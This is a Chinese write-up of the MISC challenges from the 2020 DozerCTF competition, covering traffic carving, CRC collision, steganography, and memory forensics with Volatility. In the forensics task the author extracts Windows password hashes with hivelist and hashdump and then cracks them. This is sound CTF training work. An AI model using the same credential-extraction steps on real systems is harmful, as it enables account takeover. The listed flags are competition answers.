# 2020 DozerCTF部分 Write Up

阅读量 **393195**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2020-06-17 09:30:25

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01dede06bf083b76ff.jpg)

## 前言

这次web题质量还可以,可惜自己还是太菜了

## MISC

###  upload

下载得到一个流量包

直接导出对象：http可以得到flag.zip

里面有5个文件，都只有6字节，所以这里是CRC碰撞

直接用工具就可以了

![](https://i.loli.net/2020/06/14/6bkHenqfN72SAaO.png)

然后找其中有意义的字符串拼接起来得到flag

flag：`Dozerctf{can_U_find_thefilefrom_traffic}`

###  py吗？

图片的LSB隐写，拖进stegslove

![](https://i.loli.net/2020/06/14/ZuJ1CKteUo3l8jr.png)

然后解一个base64就可以得到flag了

`flag:Dozerctf{python_is_the_best_language!}`

###  问卷调查

pass

###  夏日计划

直接用7z打开可以看见一个lfsr隐写

![](https://i.loli.net/2020/06/14/zGwZhkjbTuKIdJ4.png)

打开这个secret.rar里面有四个文件，

里面都是坐标，所以根据坐标作图得到

![](https://i.loli.net/2020/06/14/uVc61SnCKvda2iH.png)

汉信码，扫码得到flag

`Dozerctf{Congratulations_U_find_it}`

###  easy_analysis

下载下来一个win7镜像，使用volatility分析

    
    
    $ volatility -f memory imageinfo                                                                              1 ↵
    Volatility Foundation Volatility Framework 2.6
    INFO    : volatility.debug    : Determining profile based on KDBG search...
              Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_23418
                         AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                         AS Layer2 : FileAddressSpace (/mnt/c/Users/lijin/Desktop/ubt/Doazer/memory)
                          PAE type : No PAE
                               DTB : 0x187000L
                              KDBG : 0xf80003ffd0a0L
              Number of Processors : 1
         Image Type (Service Pack) : 1
                    KPCR for CPU 0 : 0xfffff80003ffed00L
                 KUSER_SHARED_DATA : 0xfffff78000000000L
               Image date and time : 2020-05-17 06:20:56 UTC+0000
         Image local date and time : 2020-05-17 14:20:56 +0800
    
    
    
    $ volatility -f memory --profile=Win7SP1x64 filescan | grep Desktop
    Volatility Foundation Volatility Framework 2.6
    0x000000001e22d680     16      0 R--rwd DeviceHarddiskVolume1Users13m0nadeDesktopdesktop.ini
    0x000000001e23cab0     16      0 R--rwd DeviceHarddiskVolume1Users13m0nadeAppDataRoamingMicrosoftWindowsStart MenuProgramsAccessoriesDesktop.ini
    0x000000001e23ed50     16      0 R--rwd DeviceHarddiskVolume1Users13m0nadeAppDataRoamingMicrosoftWindowsStart MenuProgramsMaintenanceDesktop.ini
    0x000000001e2406c0     16      0 R--rwd DeviceHarddiskVolume1Users13m0nadeAppDataRoamingMicrosoftWindowsStart MenuProgramsAccessoriesAccessibilityDesktop.ini
    0x000000001e240960     16      0 R--rwd DeviceHarddiskVolume1ProgramDataMicrosoftWindowsStart MenuProgramsAccessoriesDesktop.ini
    0x000000001e241f20     16      0 R--rwd DeviceHarddiskVolume1Users13m0nadeAppDataRoamingMicrosoftWindowsStart MenuProgramsAccessoriesSystem ToolsDesktop.ini
    0x000000001e243620     16      0 R--rwd DeviceHarddiskVolume1ProgramDataMicrosoftWindowsStart MenuProgramsMaintenanceDesktop.ini
    0x000000001e244070     16      0 R--rwd DeviceHarddiskVolume1ProgramDataMicrosoftWindowsStart MenuProgramsGamesDesktop.ini
    0x000000001e2fa940      2      1 R--rwd DeviceHarddiskVolume1Users13m0nadeDesktopflag
    0x000000001e314f20      2      1 R--rwd DeviceHarddiskVolume1Users13m0nadeDesktopflag
    0x000000001e515f20      1      0 R--rwd DeviceHarddiskVolume1UsersPublicDesktopdesktop.ini
    0x000000001e569520     16      0 R--rwd DeviceHarddiskVolume1ProgramDataMicrosoftWindowsStart MenuProgramsAccessoriesSystem ToolsDesktop.ini
    0x000000001e5c0d00     16      0 R--rwd DeviceHarddiskVolume1ProgramDataMicrosoftWindowsStart MenuProgramsAccessoriesAccessibilityDesktop.ini
    0x000000001e644ca0      2      1 R--rwd DeviceHarddiskVolume1UsersPublicDesktop
    0x000000001e68dbb0      2      1 R--rwd DeviceHarddiskVolume1Users13m0nadeDesktop
    0x000000001e6fac70      2      1 R--rwd DeviceHarddiskVolume1UsersPublicDesktop
    0x000000001e7333a0      2      1 R--rwd DeviceHarddiskVolume1Users13m0nadeDesktop
    0x000000001e76e070      1      1 R--rw- DeviceHarddiskVolume1Users13m0nadeDesktopflag
    0x000000001e85f430      2      0 RW---- DeviceHarddiskVolume1Users13m0nadeDesktopflaganalys
    

发现有个analys的文件，dump下来

    
    
    $ volatility -f memory --profile=Win7SP1x64 dumpfiles -Q 0x000000001e85f430 -n --dump-dir=./
    Volatility Foundation Volatility Framework 2.6
    DataSectionObject 0x1e85f430   None   DeviceHarddiskVolume1Users13m0nadeDesktopflaganalys
    

然后file查看是什么文件得到

    
    
    $ file file.None.0xfffffa8000dd4520.analys.dat
    file.None.0xfffffa8000dd4520.analys.dat: Zip archive data, at least v2.0 to extract
    

然后转回Windows，使用winrar打开，发现备注

![](https://i.loli.net/2020/06/14/3lRXrwDIguHdFsO.png)

于是易得压缩包密码为系统密码，于是回到内存提取系统密码

提取内存表：

    
    
    $ volatility -f memory --profile=Win7SP1x64 hivelist                                                        127 ↵
    Volatility Foundation Volatility Framework 2.6
    Virtual            Physical           Name
    ------------------ ------------------ ----    0xfffff8a001686010 0x0000000017493010 SystemRootSystem32ConfigSECURITY
    0xfffff8a0016de220 0x0000000016f3b220 ??C:WindowsServiceProfilesNetworkServiceNTUSER.DAT
    0xfffff8a001747010 0x0000000015780010 ??C:WindowsServiceProfilesLocalServiceNTUSER.DAT
    0xfffff8a001de5010 0x000000000bc42010 ??C:Users13m0nadentuser.dat
    0xfffff8a001e23010 0x0000000010569010 ??C:Users13m0nadeAppDataLocalMicrosoftWindowsUsrClass.dat
    0xfffff8a00000d250 0x000000000f02c250 [no name]
    0xfffff8a000024010 0x000000000f1e7010 REGISTRYMACHINESYSTEM
    0xfffff8a000062010 0x000000000f1a7010 REGISTRYMACHINEHARDWARE
    0xfffff8a00053b010 0x0000000008fd9010 DeviceHarddiskVolume1BootBCD
    0xfffff8a001341010 0x0000000007626010 SystemRootSystem32ConfigSOFTWARE
    0xfffff8a0014a3010 0x00000000073a7010 SystemRootSystem32ConfigDEFAULT
    0xfffff8a00167a010 0x0000000017553010 SystemRootSystem32ConfigSAM
    

得到系统密码哈希值：

    
    
    $ volatility -f memory --profile=Win7SP1x64 hashdump -y 0xfffff8a000024010 -s 0xfffff8a00167a010
    Volatility Foundation Volatility Framework 2.6
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    13m0nade:1000:aad3b435b51404eeaad3b435b51404ee:::
    

然后查找13m0nade用户的哈希在线破解，得到密码：

![](https://i.loli.net/2020/06/14/IKRG7Q4t1f9AzLb.png)

解压后有一个zip和一个键盘流量数据包，使用学长写的[解密鼠标以及键盘流量工具](https://github.com/FzWjScJ/knm)解得键盘流量

    
    
    A
    <CAP>utokey  ylltmftnxbkgvcyydbuhdlcpspsptswrmwjjmnjgtylkegittoibgo    good luck %
    

然后又用网上的自破解autokey的[工具](http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/)解密了`ylltmftnxbkgvcyydbuhdlcpspsptswrmwjjmnjgtylkegittoibgo`

    
    
    $ python breakautokey.py
    -340.537640983 autokey, klen 3 :"GTL", SSABUFSTSJROMLKMSRIPMDNDPCPARDWAJAJAMEJUPPRVPPNEEBEXFK
    -303.67293062 autokey, klen 4 :"GZKS", SMBBUTSMDISUSUGELHODSEOMALEDTHSOTPRVTYSLAATZEGPUPITHRG
    -298.325410769 autokey, klen 5 :"XRAEF", BULPHEZCIUGHTUESWIADLPUPPEDVEDSORSGRYWRACAPTEEIEAKETCO
    -306.705331035 autokey, klen 6 :"KGUMES", OFRHINFIGUCTQUSEBIENLHBHOCHISLIPFORYEYESCAHMAOGTMCINAV
    -291.968415286 autokey, klen 7 :"QSLAIRJ", ITATEOKFEBRCHSTUCKSALSINIXSEBKJJPEFICEARPTDIAGREALABAX
    -285.660963176 autokey, klen 8 :"UISFUDTT", EDTOSCAUTYRSDAYEKDDPALELIMPATHSGEKUJTGRAPORBLARTEARAVO
    -240.195347874 autokey, klen 9 :"KEYFORZIP", OHNOYOUFINDTHEKEYTHEKEYFORZIPISTHISKEYBOARDSUCKSFORYOU
    -269.034907459 autokey, klen 10 :"GXYRBFEZFI", SONCLAPOSTSSIANYONCOLTUPFRECRELYSHESILSCIATDAOAIBMABNL
    -262.15282417 autokey, klen 11 :"JUHJTOLAUID", PREKTRINDTHREYOFMTHEKELLUBNDALSHILYPLAGGIGECTITITICTAK
    -259.450139186 autokey, klen 12 :"HLNHYMBGGXCP", RAYMOTSHREIRECAMPICAMHUYONSDEKURAPPLYARDPORTERTIVORYRA
    -251.472270366 autokey, klen 13 :"ONZFZCFRQXZGC", KYMONDOWHELATSAMPORTHEYESWAPHDIATPFLIVNGERICENTOIGNOAK
    -241.477636106 autokey, klen 14 :"LNALZMMJZZKVOY", NYLINTHEYCALHELASTHOWHENSELLISEYFINCIARCINDSAIDLGMABPM
    -241.848498367 autokey, klen 15 :"WIDRTHBFVBXCZAK", CDICTYSICANEWCOWATSOFTUNSCOTREARTEVETTWORKSTAGRAPTEINS
    -243.496316226 autokey, klen 16 :"FSEPRHXGXQKTTOGU", TTHEVYWHALANCOSEKINDINGISESCREENCOWGEADYBUTINCEGRAMVCO
    -243.250500444 autokey, klen 17 :"EYIQEDPGTBZCHXHYB", UNDDICEHEALEOFRACHHEADALLLSEPERAMUCCINGGINASARECTCOZEG
    -225.582389639 autokey, klen 18 :"MRAIVBTBJZKVDOQFWJ", MULLREAMOCALSOITHSINSALLSDENTHEDEDCREARGINTHATPMPLEYEX
    -225.590587902 autokey, klen 19 :"WLAIAFAJZBZYVJULBXU", CALLMATEYALIATENCEAFDARDSWORTHORTSWHINEDTHISISRAMARIOS
    

得到：`OHNOYOUFINDTHEKEYTHEKEYFORZIPISTHISKEYBOARDSUCKSFORYOU`，flag的压缩包密码就为：`THISKEYBOARDSUCKSFORYOU`，

解压后得到一堆base64

    
    
    ODk1MDRFNDcwRDBBMUEwQTAwMDAwMDBENDk0ODQ0NTIwMDAwMDIwMDAwMDAwMjAwMDgwNjAwMDAwMEZ=
    NDc4RDRGQTAwMDAwMDAxNzM1MjQ3NDIwMEFFQ0UxQ0U5MDAwMDAwMDQ2NzQxNEQ0MTAwMDBCMThGMEI=
    RkM2MTA1MDAwMDAwMjA2MzQ4NTI0RDAwMDA3QTI2MDAwMDgwODQwMDAwRkEwMDAwMDA4MEU4MDAwMDd=
    NTMwMDAwMEVBNjAwMDAwM0E5ODAwMDAxNzcwOUNCQTUxM0MwMDAwMDAwOTcwNDg1OTczMDAwMDBFQzQ=
    MDAwMDBFQzQwMTk1MkIwRTFCMDAwMEZGNzk0OTQ0NDE1NDc4NUVFQ0ZEQzk5MjZDNTk3NkE2ODlFRER=
    M0FCNUE3QkVGNzVGN0YwODg0MEEwQUQ4RTk5QTQ5MEE4MkFDOTRBNjZCMjgwNDQwNTkwQUMyMjFGQTS=
    NjYyNTU5MDg4MDQzOEE1QzBFMzlFMDJCNzA1MjEzOEUzOEUwN0I1MDg0MTMwRTk4QzgwNDA0MDFDMDP=
    REJDQjk5RDk5Njk3NzVBN0VERkFGOEU3QTg5NzRCQjZFNkU2NkFBNDdDRkQ5N0IzNUZGNkFGNkRBNkL=
    NTdCRkZFQkZGRTlGQjdDMkQ3NTI3NkE1NkM1MzY5RUE3MzI5QTdCOUQ0RkJBMTZDNzM1NTRBREY5NDd=
    NTNFOTc2NjFCQ0FDMkZCRUJGQzVDOUFGRDZENTk3ODZGMURDNzUyM0FCRTk3QUU1NDAzOUZBRjJFQTX=
    N0E5OTc4NkQyRUQ1QjJGMDMyOUY1OTJBRUVEOTk0N0E5OTRBM0QxRENCREM3REM5NzM4RTY1NUI2RjS=
    QUQzQkU5NDdBMUVDQjNBRjRBNTE5Qjk3RTc4NTVFQUY1NThFQURCQkI1MjlGQkUyRkY1RjBEOUY1OUW=
    REI1Q0Q2QUEyQkNERDA5NjZBMkRBNUU5RUIzMjZGMkI2MzYxNzg2NTJEMTVBMzlGQzdCQTU0Qjc2RER=
    OTRFRENDRkYxNUM0RTY1NTlGNzY1RjlGNDREMTlFQjgxNjdGQ0E0OEMxRkRFOTdFM0NCNThCNjhGMka=
    RTU1MzNCOTQ2NzdFOUYwRUU3QjJENDU1MzlBRjZEOTlENkExRDRFM0M3NTJERkJEMjlGQjZFMkFEMzd=
    ODI4REQyMDFERDZEMkI2M0NCQkRBNEFCQkQ1NTBDQkY5RDVBNURCMzU3Qzc2MkExNUVGNkZCRUJFNDJ=
    MUZBOUI5NzM1NDRERTlENzg1QkYxOURGNUExNzVGQUVBQUE1QjQ3NUNCQTcxNzY4QjY5NEFBNjlGOTh=
    RDc5MzFDNzBERkFDRTg1QjE0RERDQUZFNkRFN0NCNkFBQkJCMkI0NUVEMTk3NzJEMzk0ODZGMUQ2NkT=
    NUQ5QUFFNjEzQ0YwNjY5RUNCN0M5RUNBRkVGNjI2Rjc1QzlCQjVENENEQzBEOEEwRjM3QTU3RjZGNUE=
    MUQ0NUI1NzM2M0VEQkMyQUYxM0Y3NkUxN0U2RDI3MURGQkNDNkI4QUIxQUJFMkNBNURFRURDQTA4M0a=
    QUI5NUYxRDZGMEI3RTY1RUQzQTlDQ0I3NkY0QTVGM0ZDMzZCNzg1ODU1REMxQjdBMzFBMjhENjczN0N=
    RDVDQjYwRTVFM0QzRjk3MTkzQUFEMEI5RkJGRTFGOUYwQjQ4MkVGNkJDMzU4NjdFRUQxN0Q1RTlBODm=
    N0IxNEZFRTYzOUY1RjZDMjczRTFFRDdBMkFFNTdDMkMzREZDNUZBN0I5NENCQjNENzIwMkJGMEI3QzY=
    NDVDQ0M5ODM5MUU0QjY5NzdBNUJEMUNDQTc0NzM4QkJDMzA2NkM4QjdGMjU2QTM1Qzc0N0RBOUM2QTn=
    OEM1Q0QzNkRFN0IyQzI4M0FEREFGMzczODY2QUYwQTNEQ0YwNzlBRTZGMzdDNkQwOTQxMTAxNkEyNjZ=
    NEE3RjM2RkVFRDVDQjU3NjQ2NzNBOTdBREVEQjgxNEY5MkQ3QjlFRkI1MkU2REQzREYzNDBDOEI4RDf=
    QkNERTk3QjYzOTIzOEIxQjc0NjBEOENDNkY4MTNGRjVFRUFFNTRDNzBGRDAxNUZBNDNBQjc1N0NFMTN=
    MzE3Rjg3RTI5NzVCRDgzNTYzQkQ4RjQwOTVFRDQ2NTYxQ0M0QTAyNjQ0Mzk3MTBFNEZBQTEyQzk1RjI=
    QzMzODk5REIwNkNGM0I3NDAzMDUyODMzRjREODZEMjM5RkJGNjE3QzI3Rjg4MjdFMzRCN0E1ODM4RTB=
    ODBFNzNFNEY5Qzg2NDgzM0M5NTE1Rjk1MTJGRDBCMzk1REZENzk2RjEzM0NFQTY0MzRGMkVFN0QyMzO=
    QjYxMUI5QThEMUExRTU4MjFFMkEyQjAzQjQ0NjBFQjgwREQ3NTU5MEY5QzAxQzk1NkRFNjA3MkQyNjJ=
    N0I5REU5NjdEMDMyRkVCQUQ5QzY3MjQxODdFMEU5NTU0ODVBNEM4RDgwOTk5NkZCODZDODQxOTM3Qzi=
    REVDNjY3QTYxM0Y0MUM0QTE5QkE4NUVCN0FGNDY5MkM0N0VFREI2RUE3NTJGN0VBMTczQ0VBRUU5MTV=
    MzY4N0U3QzJFMTM3MzUxRjYzQUY5MEExRDM2RjQ3MkU1NjcxOUI2MzI5RjE4NEY4QkQ0RDRGMDE4N0T=
    REU5MDc5NzkzRTgzMTNENUU1NDMzOUY3MEZBNTNBRjg3QTAzNUZCODM3QjIwNjMwOTUxMTU5QUM1MEO=
    NDExQTIyQzVCODVCQzIwMjdDODNEMkE4QkZFNDE5M0U3MjNCQUNFRkQxOUU4QzNGQTUyOUE1QjM0QUP=
    RTI5RURENzMxOUEwNjc3RkM3Nzg3QzJFQjIxNUZENDE0NjFBNjg1MDBEMDg1RUYzQzg5MDRFQ0MxQjd=
    RTgwOTEzNUIzNDREMkY5RUNBRTZDRTM4NUIxREQ0MTQyREUzRjMyOTZFRDE2MTE3RjgyRUVDODMzRjO=
    QTkyRUUwQzU4RTlGNENBRkU1RjlEMzBFREQ4NzFFNTVGRjBBREEyM0VEQ0IyN0VFNzNDQjVDRTBBMTC=
    MjBFMkZCNkUxQkUzNDNDQUY0MjFFOTc0Njc5N0MwNjIzNzkyMjc4NUFGNkY3M0M5M0I5MjEyN0NBNDF=
    RjRBQUJFMDE1QTk4N0Y3NTYwNUNFODM2NkNEQkQwNjk5NTYwQkVFMzE5MTc3RjQ3NkZBMUUzQjY4MUJ=
    QjM1Q0ZFQTFFNEEwMTFCMzZGNDMwNThDQjlDOUI4OUQ3MTUwRTY4RDQ3NEU4MEI3N0YzNkI5Qjc5NEX=
    MDFCRkQ1NTE2NDcxNkVCRjQ0MUNCRjJEMDMzQUIzRkJBREFFNzQ5RjdGODZCQTIyMTdEODg4QUE1MTB=
    NkY3QzgyQTM0REFGNkE1MDJCQjJBRTU1NTk5NTM0RjZCRTgwOTM2MkYxMzk4MERFREE2Q0JCMTFDOUU=
    QTY3MkZBMDdGMEY5RUJCMTdDRjNFRkJGMkIxRkRGNkQzQzlCNkJCMTBGMTgwQ0FFOUZDQjAwN0YxMUF=
    QUQyREQ3MTdGRTdDRDZCQ0EzRUNDMkUyQkY3ODNCM0UwRTQ1NkY2NUI1QjQ2MzA3QTNCODMwNUQzQTG=
    OUNDQTJEQjc5OEUwNkQxNzVDNTkyNjZEOEFCNjA0REUzMTQ3QjE3MzNCRjEzQUI2NDBCQzlGRTY4RkW=
    NTA2MTk0N0JDRDAwN0U2Q0IxOEI2QUUyRDM3RENFQkQ4RENGMURFQTU3QzgyRUZCN0U4NUMzNUEwQjN=
    NEZEODQ2NkNENEEyM0NBMkVDQjJCMDkzOTcxNUVGODk5N0Q4RDY4QTMxNjkwMThFMTdFRUM1NzM3NzB=
    Rjc1MTlDRjNDODMyMTU1MDA1QkI1RjFBMTFFQ0MxODNGMzBBRjFCRjQwMkJDRTVCM0U1MEU0Qzg2RDf=
    NkRDREY4Q0E2N0M4RDVBN0IyRjZFOEUyQ0I1MkZBM0RCMkNERkQyQTMwNzBENTk2NENDODNDNzI3OEM=
    QkYzMUUxRjZFQ0FGREVGRkQ1NkU5MzJCRjg1MzE2MDJCQzE4NkQzRkI5N0YyRERERjYyNjNDM0Q1MUb=
    QkY3RUZDRkFGMUVCQzdBRjFGQkY3RUZDRkFGMUVCM0ZBOEFGMUYxRDgwMUZCRjdFRkNGQUYxRUJDN0F=
    RjFGQkY3RUZDRkEwRkYwRUI0NzA3RTBDN0FGMUZCRjdFRkNGQUYxRUJDN0FGMUZCRkZFMDNGQ0ZBRDF=
    MDFGOEYxRUJDN0FGMUZCRjdFRkNGQUYxRUJDN0FGRkYwMEJGOUE1RkZENzc3RkY0RDYyMjlGRkFGMkH=
    OTJDQ0JBOUQ0MTYzNjU1NEI1OTE3NEJCMTRFNjUyOTg3RDJBQzRERDk3ODdGNkJGQjE0QTNBQzk3NkL=
    ODk1MDRFNDcwRDBBMUEwQTAwMDAwMDBENDk0ODQ0NTIwMDAwMDIwMDAwMDAwMjAwMDgwNjAwMDAwMEZ=
    NDc4RDRGQTAwMDAwMDAxNzM1MjQ3NDIwMEFFQ0UxQ0U5MDAwMDAwMDQ2NzQxNEQ0MTAwMDBCMThGMEK=
    RkM2MTA1MDAwMDAwMjA2MzQ4NTI0RDAwMDA3QTI2MDAwMDgwODQwMDAwRkEwMDAwMDA4MEU4MDAwMDd=
    NTMwMDAwMEVBNjAwMDAwM0E5ODAwMDAxNzcwOUNCQTUxM0MwMDAwMDAwOTcwNDg1OTczMDAwMDBFQzR=
    MDAwMDBFQzQwMTk1MkIwRTFCMDAwMEZGNzk0OTQ0NDE1NDc4NUVFQ0ZEQzk5MjZDNTk3NkE2ODlFREQ=
    M0FCNUE3QkVGNzVGN0YwODg0MEEwQUQ4RTk5QTQ5MEE4MkFDOTRBNjZCMjgwNDQwNTkwQUMyMjFGQTT=
    NjYyNTU5MDg4MDQzOEE1QzBFMzlFMDJCNzA1MjEzOEUzOEUwN0I1MDg0MTMwRTk4QzgwNDA0MDFDMDN=
    REJDQjk5RDk5Njk3NzVBN0VERkFGOEU3QTg5NzRCQjZFNkU2NkFBNDdDRkQ5N0IzNUZGNkFGNkRBNkI=
    NTdCRkZFQkZGRTlGQjdDMkQ3NTI3NkE1NkM1MzY5RUE3MzI5QTdCOUQ0RkJBMTZDNzM1NTRBREY5NDd=
    NTNFOTc2NjFCQ0FDMkZCRUJGQzVDOUFGRDZENTk3ODZGMURDNzUyM0FCRTk3QUU1NDAzOUZBRjJFQTX=
    N0E5OTc4NkQyRUQ1QjJGMDMyOUY1OTJBRUVEOTk0N0E5OTRBM0QxRENCREM3REM5NzM4RTY1NUI2RjQ=
    QUQzQkU5NDdBMUVDQjNBRjRBNTE5Qjk3RTc4NTVFQUY1NThFQURCQkI1MjlGQkUyRkY1RjBEOUY1OUX=
    REI1Q0Q2QUEyQkNERDA5NjZBMkRBNUU5RUIzMjZGMkI2MzYxNzg2NTJEMTVBMzlGQzdCQTU0Qjc2RER=
    OTRFRENDRkYxNUM0RTY1NTlGNzY1RjlGNDREMTlFQjgxNjdGQ0E0OEMxRkRFOTdFM0NCNThCNjhGMkb=
    RTU1MzNCOTQ2NzdFOUYwRUU3QjJENDU1MzlBRjZEOTlENkExRDRFM0M3NTJERkJEMjlGQjZFMkFEMze=
    ODI4REQyMDFERDZEMkI2M0NCQkRBNEFCQkQ1NTBDQkY5RDVBNURCMzU3Qzc2MkExNUVGNkZCRUJFNDJ=
    MUZBOUI5NzM1NDRERTlENzg1QkYxOURGNUExNzVGQUVBQUE1QjQ3NUNCQTcxNzY4QjY5NEFBNjlGOTh=
    RDc5MzFDNzBERkFDRTg1QjE0RERDQUZFNkRFN0NCNkFBQkJCMkI0NUVEMTk3NzJEMzk0ODZGMUQ2NkR=
    NUQ5QUFFNjEzQ0YwNjY5RUNCN0M5RUNBRkVGNjI2Rjc1QzlCQjVENENEQzBEOEEwRjM3QTU3RjZGNUH=
    MUQ0NUI1NzM2M0VEQkMyQUYxM0Y3NkUxN0U2RDI3MURGQkNDNkI4QUIxQUJFMkNBNURFRURDQTA4M0b=
    QUI5NUYxRDZGMEI3RTY1RUQzQTlDQ0I3NkY0QTVGM0ZDMzZCNzg1ODU1REMxQjdBMzFBMjhENjczN0M=
    RDVDQjYwRTVFM0QzRjk3MTkzQUFEMEI5RkJGRTFGOUYwQjQ4MkVGNkJDMzU4NjdFRUQxN0Q1RTlBODn=
    N0IxNEZFRTYzOUY1RjZDMjczRTFFRDdBMkFFNTdDMkMzREZDNUZBN0I5NENCQjNENzIwMkJGMEI3QzZ=
    NDVDQ0M5ODM5MUU0QjY5NzdBNUJEMUNDQTc0NzM4QkJDMzA2NkM4QjdGMjU2QTM1Qzc0N0RBOUM2QTk=
    OEM1Q0QzNkRFN0IyQzI4M0FEREFGMzczODY2QUYwQTNEQ0YwNzlBRTZGMzdDNkQwOTQxMTAxNkEyNjZ=
    NEE3RjM2RkVFRDVDQjU3NjQ2NzNBOTdBREVEQjgxNEY5MkQ3QjlFRkI1MkU2REQzREYzNDBDOEI4RDd=
    QkNERTk3QjYzOTIzOEIxQjc0NjBEOENDNkY4MTNGRjVFRUFFNTRDNzBGRDAxNUZBNDNBQjc1N0NFMTN=
    MzE3Rjg3RTI5NzVCRDgzNTYzQkQ4RjQwOTVFRDQ2NTYxQ0M0QTAyNjQ0Mzk3MTBFNEZBQTEyQzk1RjJ=
    QzMzODk5REIwNkNGM0I3NDAzMDUyODMzRjREODZEMjM5RkJGNjE3QzI3Rjg4MjdFMzRCN0E1ODM4RTA=
    ODBFNzNFNEY5Qzg2NDgzM0M5NTE1Rjk1MTJGRDBCMzk1REZENzk2RjEzM0NFQTY0MzRGMkVFN0QyMzP=
    QjYxMUI5QThEMUExRTU4MjFFMkEyQjAzQjQ0NjBFQjgwREQ3NTU5MEY5QzAxQzk1NkRFNjA3MkQyNjI=
    N0I5REU5NjdEMDMyRkVCQUQ5QzY3MjQxODdFMEU5NTU0ODVBNEM4RDgwOTk5NkZCODZDODQxOTM3Qzi=
    REVDNjY3QTYxM0Y0MUM0QTE5QkE4NUVCN0FGNDY5MkM0N0VFREI2RUE3NTJGN0VBMTczQ0VBRUU5MTV=
    MzY4N0U3QzJFMTM3MzUxRjYzQUY5MEExRDM2RjQ3MkU1NjcxOUI2MzI5RjE4NEY4QkQ0RDRGMDE4N0R=
    REU5MDc5NzkzRTgzMTNENUU1NDMzOUY3MEZBNTNBRjg3QTAzNUZCODM3QjIwNjMwOTUxMTU5QUM1MEP=
    NDExQTIyQzVCODVCQzIwMjdDODNEMkE4QkZFNDE5M0U3MjNCQUNFRkQxOUU4QzNGQTUyOUE1QjM0QUP=
    RTI5RURENzMxOUEwNjc3RkM3Nzg3QzJFQjIxNUZENDE0NjFBNjg1MDBEMDg1RUYzQzg5MDRFQ0MxQjd=
    RTgwOTEzNUIzNDREMkY5RUNBRTZDRTM4NUIxREQ0MTQyREUzRjMyOTZFRDE2MTE3RjgyRUVDODMzRjO=
    QTkyRUUwQzU4RTlGNENBRkU1RjlEMzBFREQ4NzFFNTVGRjBBREEyM0VEQ0IyN0VFNzNDQjVDRTBBMTA=
    MjBFMkZCNkUxQkUzNDNDQUY0MjFFOTc0Njc5N0MwNjIzNzkyMjc4NUFGNkY3M0M5M0I5MjEyN0NBNDF=
    RjRBQUJFMDE1QTk4N0Y3NTYwNUNFODM2NkNEQkQwNjk5NTYwQkVFMzE5MTc3RjQ3NkZBMUUzQjY4MUJ=
    QjM1Q0ZFQTFFNEEwMTFCMzZGNDMwNThDQjlDOUI4OUQ3MTUwRTY4RDQ3NEU4MEI3N0YzNkI5Qjc5NEW=
    MDFCRkQ1NTE2NDcxNkVCRjQ0MUNCRjJEMDMzQUIzRkJBREFFNzQ5RjdGODZCQTIyMTdEODg4QUE1MTD=
    NkY3QzgyQTM0REFGNkE1MDJCQjJBRTU1NTk5NTM0RjZCRTgwOTM2MkYxMzk4MERFREE2Q0JCMTFDOUW=
    QTY3MkZBMDdGMEY5RUJCMTdDRjNFRkJGMkIxRkRGNkQzQzlCNkJCMTBGMTgwQ0FFOUZDQjAwN0YxMUF=
    QUQyREQ3MTdGRTdDRDZCQ0EzRUNDMkUyQkY3ODNCM0UwRTQ1NkY2NUI1QjQ2MzA3QTNCODMwNUQzQTG=
    OUNDQTJEQjc5OEUwNkQxNzVDNTkyNjZEOEFCNjA0REUzMTQ3QjE3MzNCRjEzQUI2NDBCQzlGRTY4RkU=
    NTA2MTk0N0JDRDAwN0U2Q0IxOEI2QUUyRDM3RENFQkQ4RENGMURFQTU3QzgyRUZCN0U4NUMzNUEwQjN=
    NEZEODQ2NkNENEEyM0NBMkVDQjJCMDkzOTcxNUVGODk5N0Q4RDY4QTMxNjkwMThFMTdFRUM1NzM3NzB=
    Rjc1MTlDRjNDODMyMTU1MDA1QkI1RjFBMTFFQ0MxODNGMzBBRjFCRjQwMkJDRTVCM0U1MEU0Qzg2RDe=
    NkRDREY4Q0E2N0M4RDVBN0IyRjZFOEUyQ0I1MkZBM0RCMkNERkQyQTMwNzBENTk2NENDODNDNzI3OEP=
    QkYzMUUxRjZFQ0FGREVGRkQ1NkU5MzJCRjg1MzE2MDJCQzE4NkQzRkI5N0YyRERERjYyNjNDM0Q1MUY=
    QkY3RUZDRkFGMUVCQzdBRjFGQkY3RUZDRkFGMUVCM0ZBOEFGMUYxRDgwMUZCRjdFRkNGQUYxRUJDN0F=
    RjFGQkY3RUZDRkEwRkYwRUI0NzA3RTBDN0FGMUZCRjdFRkNGQUYxRUJDN0FGMUZCRkZFMDNGQ0ZBRDH=
    MDFGOEYxRUJDN0FGMUZCRjdFRkNGQUYxRUJDN0FGRkYwMEJGOUE1RkZENzc3RkY0RDYyMjlGRkFGMkG=
    OTJDQ0JBOUQ0MTYzNjU1NEI1OTE3NEJCMTRFNjUyOTg3RDJBQzRERDk3ODdGNkJGQjE0QTNBQzk3NkJ=
    ODk1MDRFNDcwRDBBMUEwQTAwMDAwMDBENDk0ODQ0NTIwMDAwMDIwMDAwMDAwMjAwMDgwNjAwMDAwMEZ=
    NDc4RDRGQTAwMDAwMDAxNzM1MjQ3NDIwMEFFQ0UxQ0U5MDAwMDAwMDQ2NzQxNEQ0MTAwMDBCMThGMEL=
    RkM2MTA1MDAwMDAwMjA2MzQ4NTI0RDAwMDA3QTI2MDAwMDgwODQwMDAwRkEwMDAwMDA4MEU4MDAwMDc=
    NTMwMDAwMEVBNjAwMDAwM0E5ODAwMDAxNzcwOUNCQTUxM0MwMDAwMDAwOTcwNDg1OTczMDAwMDBFQzT=
    MDAwMDBFQzQwMTk1MkIwRTFCMDAwMEZGNzk0OTQ0NDE1NDc4NUVFQ0ZEQzk5MjZDNTk3NkE2ODlFRER=
    M0FCNUE3QkVGNzVGN0YwODg0MEEwQUQ4RTk5QTQ5MEE4MkFDOTRBNjZCMjgwNDQwNTkwQUMyMjFGQTS=
